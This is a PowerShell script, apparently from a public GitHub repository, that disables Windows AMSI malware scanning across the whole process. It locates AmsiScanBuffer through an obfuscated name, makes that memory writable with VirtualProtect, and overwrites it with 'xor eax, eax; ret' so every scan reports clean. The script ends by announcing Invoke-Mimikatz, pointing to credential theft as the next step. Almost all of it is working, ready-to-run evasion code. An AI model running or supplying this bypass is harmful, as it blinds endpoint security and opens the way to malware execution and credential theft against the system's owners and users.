function GlobalAMSIBypass {
<#
    .SYNOPSIS
        Performs a global AMSI bypass by patching amsi.dll in memory.
    .DESCRIPTION
        This function modifies the AmsiScanBuffer function in amsi.dll to always
        return AMSI_RESULT_CLEAN, affecting all AMSI scanning within the current process.
	 .LINK
     https://github.com/Chainski/GlobalAMSIBypass
#>
Write-Host "[*] Initializing global AMSI bypass via AmsiScanBuffer patch..."
function LookupFunc($moduleName, $functionName) {
    Write-Host "[*] Looking up $functionName in $moduleName"
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {$_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll'}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = $assem.GetMethods() | Where-Object {$_.Name -eq 'GetProcAddress'};$handle = $assem.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    $address = $tmp[0].Invoke($null, @($handle, $functionName))
    Write-Host "[+] Found $functionName at 0x$($address.ToString('X8'))"
    return $address
}
function Get-DelegateType {
    param([Type[]]$parameters,[Type]$returnType = [Void])
    Write-Host "[*] Creating delegate type for function pointer"
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('ReflectedDelegate')),[Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[Reflection.CallingConventions]::Standard,$parameters).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual',$returnType, $parameters).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
    }
    Write-Host "[*] Locating AmsiScanBuffer in amsi.dll"
    [IntPtr]$funcAddr = LookupFunc amsi.dll ('A'+[char]109+'s'+'i'+[char]83+'c'+[char]97+'n'+'B'+[char]117+'ff'+[char]101+'r')
    [IntPtr]$targetAddr = [long]$funcAddr + 106
    Write-Host "[+] Targeting patch address: 0x$($targetAddr.ToString('X8'))"
    Write-Host "[*] Preparing VirtualProtect delegate"
    $vpDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $vp = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc "kernel32.dll" "VirtualProtect"),$vpDelegate)
    Write-Host "[*] Changing memory protection to PAGE_EXECUTE_READWRITE"
    $oldProtection = 0;$success = $vp.Invoke($targetAddr, 3, 0x40, [ref]$oldProtection)
    Write-Host "[*] Applying patch (xor eax, eax; ret)"
    $patchBytes = ([Convert]::FromBase64String('SDHA'))
    [Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $targetAddr, $patchBytes.Length)
    Write-Host "[*] Restoring memory protection to PAGE_EXECUTE_READ"
    $vp.Invoke($targetAddr, 3, 0x20, [ref]$oldProtection) | Out-Null
    Write-Host "[!] Global AMSI bypass completed successfully!"
}
GlobalAMSIBypass
Write-Host "[!] Invoke-Mimikatz" -ForeGroundColor Green
